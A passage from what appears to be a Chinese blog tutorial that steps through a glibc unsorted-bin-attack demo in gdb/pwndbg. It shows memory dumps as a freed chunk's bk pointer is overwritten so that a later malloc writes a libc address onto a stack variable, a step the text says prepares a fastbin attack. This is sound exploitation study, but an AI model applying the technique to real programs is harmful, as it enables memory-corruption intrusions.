class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from demo...done.<br>pwndbg&gt; b 12<br>Breakpoint 1 at 0x400722: file demo.c, line 12.<br>pwndbg&gt; r<br>Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo <br>unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数<br><br><br>Breakpoint 1, <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> at demo.c:12<br>12    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────<br> RAX  <span class="hljs-number">0x51</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04380</span> (__write_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x7ffff7dd3770</span> (_IO_stdfile_2_lock) ◂— <span class="hljs-number">0x0</span><br> RDI  <span class="hljs-number">0x2</span><br> RSI  <span class="hljs-number">0x7fffffffb6e0</span> ◂— <span class="hljs-number">0x87e5acbbe49188e6</span><br> R8   <span class="hljs-number">0x7ffff7fda700</span> ◂— <span class="hljs-number">0x7ffff7fda700</span><br> R9   <span class="hljs-number">0x51</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x4005b0</span> (_start) ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br> RIP  <span class="hljs-number">0x400722</span> (main+<span class="hljs-number">124</span>) ◂— mov    edi, <span class="hljs-number">0x410</span><br>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0x400722</span> &lt;main+<span class="hljs-number">124</span>&gt;    mov    edi, <span class="hljs-number">0x410</span><br>   <span class="hljs-number">0x400727</span> &lt;main+<span class="hljs-number">129</span>&gt;    call   <span class="hljs-built_in">malloc</span>@plt &lt;<span class="hljs-built_in">malloc</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40072c</span> &lt;main+<span class="hljs-number">134</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">0x10</span>], rax<br>   <span class="hljs-number">0x400730</span> &lt;main+<span class="hljs-number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x200929</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400737</span> &lt;main+<span class="hljs-number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x40073b</span> &lt;main+<span class="hljs-number">149</span>&gt;    mov    esi, <span class="hljs-number">0x400a18</span><br>   <span class="hljs-number">0x400740</span> &lt;main+<span class="hljs-number">154</span>&gt;    mov    rdi, rax<br>   <span class="hljs-number">0x400743</span> &lt;main+<span class="hljs-number">157</span>&gt;    mov    eax, <span class="hljs-number">0</span><br>   <span class="hljs-number">0x400748</span> &lt;main+<span class="hljs-number">162</span>&gt;    call   <span class="hljs-built_in">fprintf</span>@plt &lt;<span class="hljs-built_in">fprintf</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40074d</span> &lt;main+<span class="hljs-number">167</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x20090c</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400754</span> &lt;main+<span class="hljs-number">174</span>&gt;    mov    rcx, rax<br>──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────<br>In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c<br>    <span class="hljs-number">7</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n"</span>);<br>    <span class="hljs-number">8</span> <br>    <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>   <span class="hljs-number">10</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n"</span>, &amp;stack_var, stack_var);<br>   <span class="hljs-number">11</span> <br> ► <span class="hljs-number">12</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>   <span class="hljs-number">13</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>   <span class="hljs-number">14</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>   <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>   <span class="hljs-number">16</span> <br>   <span class="hljs-number">17</span>     <span class="hljs-built_in">free</span>(p);<br>──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdd78</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdd80</span> —▸ <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdd88</span> ◂— <span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ rbp  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0x7fffffffdd98</span> —▸ <span class="hljs-number">0x7ffff7a2d840</span> (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdda0</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdda8</span> —▸ <span class="hljs-number">0x7fffffffde78</span> —▸ <span class="hljs-number">0x7fffffffe20d</span> ◂— <span class="hljs-string">'/home/ubuntu/Desktop/unsortedbin_demo/demo'</span><br>────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>           <span class="hljs-number">400722</span> main+<span class="hljs-number">124</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>看一下这时的本地变量情况：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x7fffffffde70</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;stack_var<br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007fffffffde70</span><br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;p<br><span class="hljs-number">0x7fffffffdd80</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">0x7fffffffdd90</span>:<span class="hljs-number">0x0000000000400870</span><span class="hljs-number">0x00007ffff7a2d840</span><br><span class="hljs-number">0x7fffffffdda0</span>:<span class="hljs-number">0x0000000000000001</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>从上面的代码框可以看到，此时：<br>● stack_var的值为0，此变量的地址为0x7fffffffdd78<br>● p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80</p><h3 id="执行unsigned-long-p-x3D-malloc-0x410"><a href="#执行unsigned-long-p-x3D-malloc-0x410" class="headerlink" title="执行unsigned long *p=malloc(0x410);"></a>执行unsigned long *p=malloc(0x410);</h3><p>对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602420</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">160</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020be1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x6024f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602420</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="执行malloc-500"><a href="#执行malloc-500" class="headerlink" title="执行malloc(500);"></a>执行malloc(500);</h3><p>现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602620</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena <br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602620</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000000209e1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x602950</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。</p><blockquote><p><strong>释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。</strong></p></blockquote><h3 id="执行free-p"><a href="#执行free-p" class="headerlink" title="执行free(p)"></a>执行free(p)</h3><p>对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span> <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>    <span class="hljs-meta">#fd#bk</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br>......(省略内容均为空)<br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> <br> #指向top_chunk<br><span class="hljs-meta">#unsortedbin指向的地方</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <br>    <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x0000000000602000</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png'><img src="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png" alt="Snipaste_2023-09-13_20-40-59.png"></p><h3 id="执行p-1-x3D-unsigned-long-amp-stack-var-2"><a href="#执行p-1-x3D-unsigned-long-amp-stack-var-2" class="headerlink" title="执行p[1]=(unsigned long)(&amp;stack_var-2);"></a>执行p[1]=(unsigned long)(&amp;stack_var-2);</h3><p>对代码第21行下断点，继续：p[1]=(unsigned long)(&amp;stack_var-2);</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x602010</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007fffffffdd68</span><br>    <span class="hljs-meta">#fd#bk被更改</span><br><span class="hljs-number">0x602020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。刚好是刚才申请的 stack_var - 0x10 的位置</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>pwndbg&gt; unsortedbin <br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x00007fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x00000000004007a8</span><span class="hljs-number">0x0000000000400870</span><br>    <span class="hljs-meta">#unsortedbin中bk指针所指向的地方</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602010</span><br>    #想要被修改为超大值的地方<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="执行malloc-0x410"><a href="#执行malloc-0x410" class="headerlink" title="执行malloc(0x410)"></a>执行malloc(0x410)</h3><p>执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的<strong>最后一个</strong>chunk拿出来。<br>由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。</p><blockquote><p>unsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即<strong>插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。</strong></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 